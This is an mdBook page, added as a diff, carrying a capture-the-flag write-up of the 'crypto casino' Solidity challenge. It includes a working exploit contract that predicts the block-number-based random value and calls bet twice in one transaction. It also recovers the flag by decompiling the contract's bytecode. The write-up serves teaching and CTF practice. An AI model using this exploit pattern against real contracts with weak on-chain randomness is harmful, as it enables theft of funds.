@@ -1,0 +1,340 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js light">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>crypto casino - RootLee CTF Writeups</title>
+        
+        
+
+
+        <!-- Custom HTML head -->
+        
+
+
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        
+        <link rel="icon" href="../../favicon.svg">
+        
+        
+        <link rel="shortcut icon" href="../../favicon.png">
+        
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+        
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+        
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        
+
+        
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="../../0x414141/index.html"><strong aria-hidden="true">1.</strong> 0x414141</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../0x414141/blockchain/index.html"><strong aria-hidden="true">1.1.</strong> Blockchain Challenges</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../0x414141/blockchain/sanity_check.html"><strong aria-hidden="true">1.1.1.</strong> sanity check</a></li><li class="chapter-item expanded "><a href="../../0x414141/blockchain/secure_enclave.html"><strong aria-hidden="true">1.1.2.</strong> secure enclave</a></li><li class="chapter-item expanded "><a href="../../0x414141/blockchain/crackme.html"><strong aria-hidden="true">1.1.3.</strong> crackme.sol</a></li><li class="chapter-item expanded "><a href="../../0x414141/blockchain/crypto_casino.html" class="active"><strong aria-hidden="true">1.1.4.</strong> crypto casino</a></li><li class="chapter-item expanded "><a href="../../0x414141/blockchain/rich_club.html"><strong aria-hidden="true">1.1.5.</strong> RICH CLUB</a></li></ol></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                        
+                    </div>
+
+                    <h1 class="menu-title">RootLee CTF Writeups</h1>
+
+                    <div class="right-buttons">
+                        
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                        
+                        
+                    </div>
+                </div>
+
+                
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1><a class="header" href="#crypto-casino" id="crypto-casino">crypto casino</a></h1>
+<p>This one is fairly easy and the exploit is really cool.</p>
+<pre><code class="language-solidity">pragma solidity ^0.6.0;
+
+contract casino {
+    bytes32 private seed;
+    mapping(address =&gt; uint) public consecutiveWins;
+
+    constructor () public{
+        seed = keccak256(&quot;satoshi nakmoto&quot;);
+    }
+
+    function bet(uint guess) public{
+        uint num = uint(keccak256(abi.encodePacked(seed, block.number))) ^ 0x539;
+        if (guess == num) {
+            consecutiveWins[msg.sender] = consecutiveWins[msg.sender] + 1;
+        } else {
+            consecutiveWins[msg.sender] = 0;
+        }
+    }
+
+    function done() public view returns (uint16[] memory) {
+        if (consecutiveWins[msg.sender] &gt; 1) {
+            return [];
+        }
+    }
+}
+</code></pre>
+<p>We need to guess the result twice to get the flag.
+Everything is deterministic, the seed, the XOR, the hash and the ABI call.
+Almost everything! The <code>block.number</code> is not.</p>
+<p>Before searching Google, how could we guess it?
+Maybe see the last block by hand and try.
+But that would not work, the transactions are queued, and we never know the final block.
+We could bruteforce it but whenever one guess fails we are back to the start.</p>
+<p>So, searching Google on how to predict the block number you would probably find this:
+<a href="https://medium.com/@saurfang/lets-play-capture-the-ether-lotteries-part-ii-478365775a34">https://medium.com/@saurfang/lets-play-capture-the-ether-lotteries-part-ii-478365775a34</a>.</p>
+<p>Reading through it you'll find that <em>you</em> can't predict the block number.
+But your contract can.
+And Ethereum has this <em>looking back its obvious property</em> that if the contract calls another one,
+all operations must be put into the same block, for consistency reasons.</p>
+<p>So, to break the casino you just need to replicate the &quot;random&quot; number generation and call the bet twice from your code.
+The exploit looks like the following:</p>
+<pre><code class="language-solidity">contract exploit {
+    bytes32 private seed;
+    constructor () public{
+        seed = keccak256(&quot;satoshi nakmoto&quot;);
+    }
+
+    function bet() public {
+        uint num = uint(keccak256(abi.encodePacked(seed, block.number))) ^ 0x539;
+        casino c = casino(0x186d5d064545f6211dD1B5286aB2Bc755dfF2F59);
+        c.bet(num);
+        c.bet(num);
+    }
+}
+</code></pre>
+<p>After running you can call <code>consecutiveWins</code> on the contract they gave you (0x186d5d064545f6211dD1B5286aB2Bc755dfF2F59).
+To get the flag you need to call done, the strategy to get the array size is the same as the previous challenge.</p>
+<pre><code class="language-python">flag = [102,108,97,103,123,68,51,67,78,55,82,64,108,49,90,51,68,95,67,64,53,49,78,48,83,95,53,117,99,107,53,51,49,125]
+&quot;&quot;.join(map(chr, flag))
+&gt; flag{D3CN7R@l1Z3D_C@51N0S_5uck531}
+</code></pre>
+<h2><a class="header" href="#cheeky-way" id="cheeky-way">Cheeky Way</a></h2>
+<p>Just like the previous challenge, head on to <a href="https://rinkeby.etherscan.io/bytecode-decompiler?a=0x186d5d064545f6211dD1B5286aB2Bc755dfF2F59">https://rinkeby.etherscan.io/bytecode-decompiler?a=0x186d5d064545f6211dD1B5286aB2Bc755dfF2F59</a> and decompile the code.</p>
+<p>The values are different but that is not a problem.</p>
+<pre><code>mem[4448] = 51000
+mem[4480] = 15 * 3600
+mem[4512] = 48500
+mem[4544] = 51500
+mem[4576] = 61500
+mem[4608] = 34000
+mem[4640] = 25500
+mem[4672] = 33500
+mem[4704] = 39000
+mem[4736] = 27500
+mem[4768] = 41000
+mem[4800] = 32000
+mem[4832] = 15 * 3600
+mem[4864] = 24500
+mem[4896] = 45000
+mem[4928] = 25500
+mem[4960] = 34000
+mem[4992] = 47500
+mem[5024] = 33500
+mem[5056] = 32000
+mem[5088] = 26500
+mem[5120] = 24500
+mem[5152] = 39000
+mem[5184] = 24000
+mem[5216] = 41500
+mem[5248] = 47500
+mem[5280] = 26500
+mem[5312] = 58500
+mem[5344] = 49500
+mem[5376] = 53500
+mem[5408] = 26500
+mem[5440] = 25500
+mem[5472] = 24500
+mem[5504] = 62500
+</code></pre>
+<p>Just do the same as they do: <code>mem[(32 * idx) + 2272] = uint16(mem[(32 * idx) + 4478 len 2] / 500)</code></p>
+<pre><code class="language-python">enc_flag = [51000,15 * 3600,48500,51500,61500,34000,25500,33500,39000,27500,41000,32000,15 * 3600,24500,45000,25500,34000,47500,33500,32000,26500,24500,39000,24000,41500,47500,26500,58500,49500,53500,26500,25500,24500,62500]
+print(&quot;&quot;.join([chr(c // 500) for c in enc_flag]))
+&gt; flag{D3CN7R@l1Z3D_C@51N0S_5uck531}
+</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                        
+                            <a rel="prev" href="../../0x414141/blockchain/crackme.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                        
+
+                        
+                            <a rel="next" href="../../0x414141/blockchain/rich_club.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                
+                    <a rel="prev" href="../../0x414141/blockchain/crackme.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                
+
+                
+                    <a rel="next" href="../../0x414141/blockchain/rich_club.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+                
+            </nav>
+
+        </div>
+
+        
+
+        
+
+        
+
+        
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        
+
+        
+
+        
+        <script src="../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../searcher.js" type="text/javascript" charset="utf-8"></script>
+        
+
+        <script src="../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+        
+
+        
+
+    </body>
+</html>
